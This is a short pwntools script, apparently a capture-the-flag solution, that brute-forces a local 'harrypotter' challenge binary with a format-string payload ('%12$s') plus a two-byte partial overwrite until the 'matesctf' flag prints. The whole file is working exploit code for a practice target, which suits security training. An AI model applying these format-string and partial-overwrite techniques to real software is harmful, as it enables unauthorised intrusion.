from pwn import *

i = 0
while True:
	print i
	i += 1
	r = process("./harrypotter")
	context.log_level = "critical"
	payload = "%12$s"
	payload = payload.ljust(0x30,"B")
	payload += "\xf0\x35"	
	r.recvuntil("spell\n")
	r.send(payload)
	try:
		msg = r.recv()
		if "matesctf{" in msg and "matesctf{}" not in msg:
			print msg
			break
		r.close()
	except:
		r.close()
